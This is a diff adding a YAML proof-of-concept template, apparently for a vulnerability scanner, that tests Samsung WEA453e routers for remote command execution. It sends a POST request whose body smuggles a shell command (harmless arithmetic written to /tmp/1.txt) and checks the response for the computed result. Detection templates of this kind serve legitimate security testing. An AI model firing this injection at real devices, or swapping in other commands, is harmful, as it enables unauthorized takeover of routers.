@@ -1,0 +1,16 @@
+name: poc-yaml-samsung-wea453e-rce
+set:
+  r1: randomInt(40000, 44800)
+  r2: randomInt(1140000, 1144800)
+rules:
+  - method: POST
+    path: /(download)/tmp/1.txt
+    follow_redirects: false
+    body: |
+      command1=shell%3Aexpr {{r1}} - {{r2}}|dd of=/tmp/1.txt
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string(r1 - r2)))
+detail:
+  author: sharecast
+  links:
+    - https://iryl.info/2020/11/27/exploiting-samsung-router-wlan-ap-wea453e/
